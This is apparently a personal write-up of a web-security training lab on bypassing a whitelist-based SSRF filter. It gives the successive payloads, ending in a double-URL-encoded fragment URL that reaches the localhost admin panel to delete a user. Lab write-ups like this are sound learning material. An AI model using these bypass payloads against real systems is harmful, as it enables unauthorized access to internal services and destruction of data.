# EXPERT: SSRF with whitelist-based input filter

This lab has an anti-SSRF (whitelist-based) protection:

![Снимок экрана 2025-12-01 в 13.39.20.png](EXPERT%20SSRF%20with%20whitelist-based%20input%20filter/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_13.39.20.png)

However, the filter that checks the presence of `stock.weliketoshop.net` could be bypassed using embedded credentials.

```jsx
http://username@stock.weliketoshop.net/
```

![Снимок экрана 2025-12-01 в 13.41.36.png](EXPERT%20SSRF%20with%20whitelist-based%20input%20filter/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_13.41.36.png)

We can see that it’s parsed our payload and tried to connect to `http://username`

We need to move allowed stock address to the anchor `#` so that it’s still in the URL, but the main address would be pointing to the [localhost](http://localhost) admin.

```jsx
http://localhost:80#@stock.weliketoshop.net
```

This response hints that there might be another filter checking for `#` 

![Снимок экрана 2025-12-01 в 13.58.07.png](EXPERT%20SSRF%20with%20whitelist-based%20input%20filter/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_13.58.07.png)

After double-URL-encoding `#` , we get

![Снимок экрана 2025-12-01 в 13.51.25.png](EXPERT%20SSRF%20with%20whitelist-based%20input%20filter/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_13.51.25.png)

And to further exploit this, we need to access `/admin` . For some strange reason, this parser is acting a bit unusual and continues URL parsing after the first slash coming after `#` :

```jsx
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```